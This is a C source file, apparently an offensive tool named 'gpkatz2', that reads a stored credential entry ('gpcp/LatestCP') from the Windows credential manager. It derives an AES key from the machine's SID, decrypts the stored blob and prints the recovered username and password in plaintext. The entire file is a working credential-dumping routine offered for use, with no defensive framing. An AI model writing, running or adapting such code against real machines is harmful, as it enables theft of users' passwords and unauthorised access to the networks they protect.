#include <windows.h>
#include <wincred.h>
#include <stdint.h>
#include <stdio.h>
#include <sddl.h>

//gcc -o gpkatz2.exe gpkatz2.c crypt.c

#define MAX_DOMAIN_LENGTH 256
#define AES_KEY_SIZE 32
#define DECRYPT 2

int crypt_aes_256_cbc(char *, char *, DWORD, DWORD, int);
int generate_key(unsigned char *, size_t, unsigned char *);
void print_in_hex(unsigned char *, int);

int main(char argc, char **argv){
	unsigned char derived_aes_key[AES_KEY_SIZE];
	PCREDENTIALA target_creds;
	PSID sid;
	DWORD sid_size = 0;
	SID_NAME_USE sid_type;
	char *decrypted;
	char *username;
	char *username_end;
	char *password;
	char *password_end;
	DWORD decrypted_count;
	char computer_name[MAX_COMPUTERNAME_LENGTH+1];
	DWORD computer_name_size = sizeof(computer_name);
	char domain_name[MAX_DOMAIN_LENGTH];
	DWORD domain_size = sizeof(domain_name);
	
	if (!CredRead("gpcp/LatestCP", CRED_TYPE_GENERIC, 0, &target_creds)) {
		printf("Failed to read from credential store: %d\n", GetLastError());
		return 1;
	}
	
    if (!GetComputerName(computer_name, &computer_name_size)) {
        printf("Failed to get computer name: %d\n", GetLastError());
		CredFree(target_creds);
        return 2;
    }	
	
	LookupAccountName(NULL, computer_name, NULL, &sid_size, domain_name, &domain_size, &sid_type);
	sid = (PSID) malloc(sid_size);

	if (LookupAccountName(NULL, computer_name, sid, &sid_size, domain_name, &domain_size, &sid_type)) {
		if (generate_key(sid, sid_size, derived_aes_key)) {
			printf("Failed to generate AES key: ", GetLastError());
			CredFree(target_creds);
			free(sid);
			return 3;
		}

		if(!(decrypted_count = crypt_aes_256_cbc(derived_aes_key, (char *) target_creds->CredentialBlob, target_creds->CredentialBlobSize, 0, DECRYPT))) {
			printf("Failed to decrypt credentials: %d", GetLastError());
			CredFree(target_creds);
			free(sid);
			return 4;
		}

		decrypted = malloc(target_creds->CredentialBlobSize);
		memcpy(decrypted, (char *) target_creds->CredentialBlob, decrypted_count);
		
		username = decrypted;
		username_end = strstr(username, "+aslfjderojd+");
		*username_end = 0;
		password = username_end + sizeof("+aslfjderojd+");
		password_end = strstr(username_end+1, "+29384372333+");
		*password_end = 0;
		
		printf("Username: %s\nPassword: %s\n", username, password);
	}  else{
		printf("Failed to get host SID: %d\n", GetLastError());
		return 5;
	}
	
	CredFree(target_creds);
	
	return 0;

}